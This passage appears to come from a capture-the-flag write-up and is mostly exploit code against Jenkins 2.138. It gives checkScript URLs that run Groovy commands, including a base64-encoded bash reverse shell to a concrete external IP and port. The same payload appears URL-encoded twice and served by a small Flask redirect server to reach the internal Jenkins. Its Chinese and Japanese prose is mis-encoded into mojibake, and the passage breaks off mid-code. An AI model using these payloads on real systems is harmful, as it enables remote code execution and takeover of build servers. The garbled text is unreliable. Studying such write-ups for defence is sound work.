class="string">"children"</span>&gt;&lt;/li&gt;&lt;/ul&gt;&lt;div <span class="built_in">id</span>=<span class="string">"breadcrumb-menu-target"</span>&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/div&gt;&lt;/div&gt;&lt;div <span class="built_in">id</span>=<span class="string">"page-body"</span> <span class="keyword">class</span>=<span class="string">"clear"</span>&gt;&lt;div <span class="built_in">id</span>=<span class="string">"side-panel"</span>&gt;&lt;div <span class="built_in">id</span>=<span class="string">"tasks"</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">"task"</span>&gt;&lt;a href=<span class="string">"/asynchPeople/"</span> <span class="keyword">class</span>=<span class="string">"task-icon-link"</span>&gt;&lt;img src=<span class="string">"/static/e1c81722/images/24x24/user.png"</span> style=<span class="string">"width: 24px; height: 24px; width: 24px; height: 24px; margin: 2px;"</span> <span class="keyword">class</span>=<span class="string">"icon-user icon-md"</span> /&gt;&lt;/a&gt; &lt;a href=<span class="string">"/asynchPeople/"</span> <span class="keyword">class</span>=<span class="string">"task-link"</span>&gt;People&lt;/a&gt;&lt;/div&gt;&lt;div <span class="keyword">class</span>=<span class="string">"task"</span>&gt;&lt;a href=<span class="string">"/view/all/builds"</span> <span class="keyword">class</span>=<span class="string">"task-icon-link"</span>&gt;&lt;img src=<span class="string">"/static/e1c81722/images/24x24/notepad.png"</span> style=<span class="string">"width: 24px; height: 24px; width: 24px; height: 24px; margin: 2px;"</span> <span class="keyword">class</span>=<span class="string">"icon-notepad icon-md"</span> /&gt;&lt;/a&gt; &lt;a href=<span class="string">"/view/all/builds"</span> <span class="keyword">class</span>=<span class="string">"task-link"</span>&gt;Build History&lt;/a&gt;&lt;/div&gt;&lt;div <span class="keyword">class</span>=<span class="string">"task"</span>&gt;&lt;a href=<span class="string">"/credentials"</span> <span class="keyword">class</span>=<span class="string">"task-icon-link"</span>&gt;&lt;img src=<span class="string">"/static/e1c81722/plugin/credentials/images/24x24/credentials.png"</span> style=<span class="string">"width: 24px; height: 24px; width: 24px; height: 24px; margin: 2px;"</span> <span class="keyword">class</span>=<span class="string">"icon-credentials-credentials icon-md"</span> /&gt;&lt;/a&gt; &lt;a href=<span class="string">"/credentials"</span> <span class="keyword">class</span>=<span class="string">"task-link"</span>&gt;Credentials&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;div <span class="built_in">id</span>=<span class="string">"buildQueue"</span> <span class="keyword">class</span>=<span class="string">"container-fluid pane-frame track-mouse expanded"</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">"row"</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">"col-xs-24 pane-header"</span>&gt;&lt;a href=<span class="string">"/toggleCollapse?paneId=buildQueue"</span> title=<span class="string">"collapse"</span> <span class="keyword">class</span>=<span class="string">"collapse"</span>&gt;&lt;img src=<span class="string">"/static/e1c81722/images/16x16/collapse.png"</span> alt=<span class="string">"collapse"</span> style=<span class="string">"width: 16px; height: 16px; "</span> <span class="keyword">class</span>=<span class="string">"icon-collapse icon-sm"</span> /&gt;&lt;/a&gt;Build Queue&lt;/div&gt;&lt;/div&gt;&lt;div <span class="keyword">class</span>=<span class="string">"row pane-content"</span>&gt;&lt;table <span class="keyword">class</span>=<span class="string">"pane "</span>&gt;&lt;script src=<span class="string">'/adjuncts/e1c81722/lib/form/link/link.js'</span> <span class="built_in">type</span>=<span class="string">'text/javascript'</span>&gt;&lt;/script&gt;&lt;tr&gt;&lt;td <span class="keyword">class</span>=<span class="string">"pane"</span> colspan=<span class="string">"2"</span>&gt;No builds <span class="keyword">in</span> the queue.&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;script defer=<span class="string">"defer"</span>&gt;refreshPart(<span class="string">'buildQueue'</span>,<span class="string">"/ajaxBuildQueue"</span>);&lt;/script&gt;&lt;div <span class="built_in">id</span>=<span class="string">"executors"</span> <span class="keyword">class</span>=<span class="string">"container-fluid pane-frame track-mouse expanded"</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">"row"</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">"col-xs-24 pane-header"</span>&gt;&lt;a href=<span class="string">"/toggleCollapse?paneId=executors"</span> title=<span class="string">"collapse"</span> <span class="keyword">class</span>=<span class="string">"collapse"</span>&gt;&lt;img src=<span class="string">"/static/e1c81722/images/16x16/collapse.png"</span> alt=<span class="string">"collapse"</span> style=<span class="string">"width: 16px; height: 16px; "</span> <span class="keyword">class</span>=<span class="string">"icon-collapse icon-sm"</span> /&gt;&lt;/a&gt;&lt;a href=<span class="string">'/computer/'</span>&gt;Build Executor Status&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;div <span class="keyword">class</span>=<span class="string">"row pane-content"</span>&gt;&lt;table <span class="keyword">class</span>=<span class="string">"pane "</span>&gt;&lt;colgroup&gt;&lt;col width=<span class="string">"30"</span> /&gt;&lt;col width=<span class="string">"200*"</span> /&gt;&lt;col width=<span class="string">"24"</span> /&gt;&lt;/colgroup&gt;&lt;tr&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td <span class="keyword">class</span>=<span class="string">"pane"</span> align=<span class="string">"right"</span> style=<span class="string">"vertical-align: top"</span>&gt;<span class="number">1</span>&lt;/td&gt;&lt;td <span class="keyword">class</span>=<span class="string">"pane"</span>&gt;Idle&lt;/td&gt;&lt;td <span class="keyword">class</span>=<span class="string">"pane"</span>&gt;&lt;/td&gt;&lt;td <span class="keyword">class</span>=<span class="string">"pane"</span>&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td <span class="keyword">class</span>=<span class="string">"pane"</span> align=<span class="string">"right"</span> style=<span class="string">"vertical-align: top"</span>&gt;<span class="number">2</span>&lt;/td&gt;&lt;td <span class="keyword">class</span>=<span class="string">"pane"</span>&gt;Idle&lt;/td&gt;&lt;td <span class="keyword">class</span>=<span class="string">"pane"</span>&gt;&lt;/td&gt;&lt;td <span class="keyword">class</span>=<span class="string">"pane"</span>&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;script defer=<span class="string">"defer"</span>&gt;refreshPart(<span class="string">'executors'</span>,<span class="string">"/ajaxExecutors"</span>);&lt;/script&gt;&lt;/div&gt;&lt;div <span class="built_in">id</span>=<span class="string">"main-panel"</span>&gt;&lt;a name=<span class="string">"skip</span></span><br></pre></td></tr></tbody></table></figure>
<p>çœ‹åˆ° jenkins ç‰ˆæœ¬ä¸º 2.138, åˆ«é—®ğŸ‘´æ€ä¹ˆçœ‹åˆ°çš„ï¼Œä½ å’‹é‚£ä¹ˆå¤šäº‹å‘¢ğŸ˜¡</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cute-puli/p/15378440.html">https://www.cnblogs.com/cute-puli/p/15378440.html</a></p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://x.x.x.x:<span class="number">8080</span>/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public%<span class="number">20</span><span class="keyword">class</span>%20x%<span class="number">20</span>{public%20x(){%<span class="number">22</span>å‘½ä»¤æ›¿æ¢%<span class="number">22.</span>execute()}}</span><br></pre></td></tr></tbody></table></figure>
<p>æ‰“è¿™ä¸ªå‘½ä»¤</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://jenkins:<span class="number">8080</span>/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public <span class="keyword">class</span> <span class="title class_">x</span> {public x(){<span class="string">"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xNDMuMTkyLjE5LzExNDUgMD4mMQ==}|{base64,-d}|{bash,-i}"</span>.execute()}}</span><br></pre></td></tr></tbody></table></figure>
<p>å…ˆæŠŠ value çš„å€¼ url ç¼–ç ï¼Œç„¶åæŠŠæ•´ä¸ªé‡å®šå‘ç½‘å€ url ç¼–ç ï¼Œ</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://jenkins:<span class="number">8080</span>/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=%<span class="number">70</span>%<span class="number">75</span>%<span class="number">62</span>%6c%<span class="number">69</span>%<span class="number">63</span>%<span class="number">20</span>%<span class="number">63</span>%6c%<span class="number">61</span>%<span class="number">73</span>%<span class="number">73</span>%<span class="number">20</span>%<span class="number">78</span>%<span class="number">20</span>%7b%0a%<span class="number">20</span>%<span class="number">20</span>%<span class="number">70</span>%<span class="number">75</span>%<span class="number">62</span>%6c%<span class="number">69</span>%<span class="number">63</span>%<span class="number">20</span>%<span class="number">78</span>%<span class="number">28</span>%<span class="number">29</span>%7b%0a%<span class="number">20</span>%<span class="number">20</span>%<span class="number">20</span>%<span class="number">20</span>%<span class="number">22</span>%<span class="number">62</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">68</span>%<span class="number">20</span>%2d%<span class="number">63</span>%<span class="number">20</span>%7b%<span class="number">65</span>%<span class="number">63</span>%<span class="number">68</span>%6f%2c%<span class="number">59</span>%6d%<span class="number">46</span>%7a%<span class="number">61</span>%<span class="number">43</span>%<span class="number">41</span>%<span class="number">74</span>%<span class="number">61</span>%<span class="number">53</span>%<span class="number">41</span>%2b%4a%<span class="number">69</span>%<span class="number">41</span>%<span class="number">76</span>%5a%<span class="number">47</span>%<span class="number">56</span>%<span class="number">32</span>%4c%<span class="number">33</span>%<span class="number">52</span>%6a%<span class="number">63</span>%<span class="number">43</span>%<span class="number">38</span>%<span class="number">30</span>%4d%<span class="number">79</span>%<span class="number">34</span>%<span class="number">78</span>%4e%<span class="number">44</span>%4d%<span class="number">75</span>%4d%<span class="number">54</span>%6b%<span class="number">79</span>%4c%6a%<span class="number">45</span>%<span class="number">35</span>%4c%7a%<span class="number">45</span>%<span class="number">78</span>%4e%<span class="number">44</span>%<span class="number">55</span>%<span class="number">67</span>%4d%<span class="number">44</span>%<span class="number">34</span>%6d%4d%<span class="number">51</span>%3d%3d%7d%7c%7b%<span class="number">62</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">65</span>%<span class="number">36</span>%<span class="number">34</span>%2c%2d%<span class="number">64</span>%7d%7c%7b%<span class="number">62</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">68</span>%2c%2d%<span class="number">69</span>%7d%<span class="number">22</span>%2e%<span class="number">65</span>%<span class="number">78</span>%<span class="number">65</span>%<span class="number">63</span>%<span class="number">75</span>%<span class="number">74</span>%<span class="number">65</span>%<span class="number">28</span>%<span class="number">29</span>%0a%<span class="number">20</span>%<span class="number">20</span>%7d%0a%7d</span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">68</span>%<span class="number">74</span>%<span class="number">74</span>%<span class="number">70</span>%3a%2f%2f%6a%<span class="number">65</span>%6e%6b%<span class="number">69</span>%6e%<span class="number">73</span>%3a%<span class="number">38</span>%<span class="number">30</span>%<span class="number">38</span>%<span class="number">30</span>%2f%<span class="number">73</span>%<span class="number">65</span>%<span class="number">63</span>%<span class="number">75</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">74</span>%<span class="number">79</span>%<span class="number">52</span>%<span class="number">65</span>%<span class="number">61</span>%6c%6d%2f%<span class="number">75</span>%<span class="number">73</span>%<span class="number">65</span>%<span class="number">72</span>%2f%<span class="number">61</span>%<span class="number">64</span>%6d%<span class="number">69</span>%6e%2f%<span class="number">64</span>%<span class="number">65</span>%<span class="number">73</span>%<span class="number">63</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">70</span>%<span class="number">74</span>%6f%<span class="number">72</span>%<span class="number">42</span>%<span class="number">79</span>%4e%<span class="number">61</span>%6d%<span class="number">65</span>%2f%6f%<span class="number">72</span>%<span class="number">67</span>%2e%6a%<span class="number">65</span>%6e%6b%<span class="number">69</span>%6e%<span class="number">73</span>%<span class="number">63</span>%<span class="number">69</span>%2e%<span class="number">70</span>%6c%<span class="number">75</span>%<span class="number">67</span>%<span class="number">69</span>%6e%<span class="number">73</span>%2e%<span class="number">73</span>%<span class="number">63</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">70</span>%<span class="number">74</span>%<span class="number">73</span>%<span class="number">65</span>%<span class="number">63</span>%<span class="number">75</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">74</span>%<span class="number">79</span>%2e%<span class="number">73</span>%<span class="number">61</span>%6e%<span class="number">64</span>%<span class="number">62</span>%6f%<span class="number">78</span>%2e%<span class="number">67</span>%<span class="number">72</span>%6f%6f%<span class="number">76</span>%<span class="number">79</span>%2e%<span class="number">53</span>%<span class="number">65</span>%<span class="number">63</span>%<span class="number">75</span>%<span class="number">72</span>%<span class="number">65</span>%<span class="number">47</span>%<span class="number">72</span>%6f%6f%<span class="number">76</span>%<span class="number">79</span>%<span class="number">53</span>%<span class="number">63</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">70</span>%<span class="number">74</span>%2f%<span class="number">63</span>%<span class="number">68</span>%<span class="number">65</span>%<span class="number">63</span>%6b%<span class="number">53</span>%<span class="number">63</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">70</span>%<span class="number">74</span>%3f%<span class="number">73</span>%<span class="number">61</span>%6e%<span class="number">64</span>%<span class="number">62</span>%6f%<span class="number">78</span>%3d%<span class="number">74</span>%<span class="number">72</span>%<span class="number">75</span>%<span class="number">65</span>%<span class="number">26</span>%<span class="number">76</span>%<span class="number">61</span>%6c%<span class="number">75</span>%<span class="number">65</span>%3d%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">62</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">62</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">62</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">62</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">62</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">62</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">62</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">64</span></span><br></pre></td></tr></tbody></table></figure>
<p>æœ€ç»ˆ exp,ğŸ‘´ã®æœ€å¾Œã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ (exloit)</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,redirect</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/evil'</span>, methods=[<span class="string">'POST'</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">evil</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">"http://124.70.33.170:8088/redirect?redirect_url=%68%74%74%70%3a%2f%2f%6a%65%6e%6b%69%6e%73%3a%38%30%38%30%2f%73%65%63%75%72%69%74%79%52%65%61%6c%6d%2f%75%73%65%72%2f%61%64%6d%69%6e%2f%64%65%73%63%72%69%70%74%6f%72%42%79%4e%61%6d%65%2f%6f%72%67%2e%6a%65%6e%6b%69%6e%73%63%69%2e%70%6c%75%67%69%6e%73%2e%73%63%72%69%70%74%73%65%63%75%72%69%74%79%2e%73%61%6e%64%62%6f%78%2e%67%72%6f%6f%76%79%2e%53%65%63%75%72%65%47%72%6f%6f%76%79%53%63%72%69%70%74%2f%63%68%65%63%6b%53%63%72%69%70%74%3f%73%61%6e%64%62%6f%78%3d%74%72%75%65%26%76%61%6c%75%65%3d%25%37%30%25%37%35%25%36%32%25%36%63%25%36%39%25%36%33%25%32%30%25%36%33%25%36%63%25%36%31%25%37%33%25%37%33%25%32%30%25%37%38%25%32%30%25%37%62%25%30%61%25%32%30%25%32%30%25%37%30%25%37%35%25%36%32%25%36%63%25%36%39%25%36%33%25%32%30%25%37%38%25%32%38%25%32%39%25%37%62%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%32%25%36%32%25%36%31%25%37%33%25%36%38%25%32%30%25%32%64%25%36%33%25%32%30%25%37%62%25%36%35%25%36%33%25%36%38%25%36%66%25%32%63%25%35%39%25%36%64%25%34%36%25%37%61%25%36%31%25%34%33%25%34%31%25%37%34%25%36%31%25%35%33%25%34%31%25%32%62%25%34%61%25%36%39%25%34%31%25%37%36%25%35%61%25%34%37%25%35%36%25%33%32%25%34%63%25%33%33%25%35%32%25%36%61%25%36%33%25%34%33%25%33%38%25%33%30%25%34%64%25%37%39%25%33%34%25%37%38%25%34%65%25%34%34%25%34%64%25%37%35%25%34%64%25%35%34%25%36%62%25%37%39%25%34%63%25%36%61%25%34%35%25%33%35%25%34%63%25%37%61%25%34%35%25%37%38%25%34%65%25%34%34%25%35%35%25%36%37%25%34%64%25%34%34%25%33%34%25%36%64%25%34%64%25%35%31%25%33%64%25%33%64%25%37%64%25%37%63%25%37%62%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%63%25%32%64%25%36%34%25%37%64%25%37%63%25%37%62%25%36%32%25%36%31%25%37%33%25%36%38%25%32%63%25%32%64%25%36%39%25%37%64%25%32%32%25%32%65%25%36%35%25%37%38%25%36%35%25%36%33%25%37%35%25%37%34%25%36%35%25%32%38%25%32%39%25%30%61%25%32%30%25%32%30%25%37%64%25%30%61%25%37%64"</span>,code=<span class="number">302</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">7777</span>)</span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231031083826.png" alt="å¾®ä¿¡æˆªå›¾_20231031083826"></p>
<p>å“ˆå“ˆå“ˆå“ˆå“ˆï¼æ¬ºéª—ä¸–ç•Œè¿™ç§äº‹æƒ…ï¼Œå¯¹äºğŸ‘´æ¥è¯´ï¼Œç®€ç›´å°èœä¸€ç¢Ÿ.</p>
<p>ã‚ãŸã—ã¯å¼·ã„ã€€ã‚ãªãŸãŸã¡ã‚ˆã‚Šå¼·ã„ï¼</p>
<p>è¿™ä¸€åˆ‡éƒ½æ˜¯å‘½è¿çŸ³ä¹‹é—¨çš„é€‰æ‹©ï¼</p>
<h1 id="~ave-mujicas-masquerade~"><span id="~ave-mujicas-masquerade~"> ~Ave Mujicaâ€™s Masquerade~</span></h1>
<p>ã€ŒãŠå¹¸ã›ã«ã€, å¸Œå•Šå“‡èµ›ä½ å¦¹çš„ï¼ŒğŸ‘´å¾ˆğŸ˜¡ğŸ˜¡.</p>
<h2 id="æºç å†²"><span id="æºç å†²"> æºç ï¼Œå†²ğŸ˜“</span></h2>
<figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title 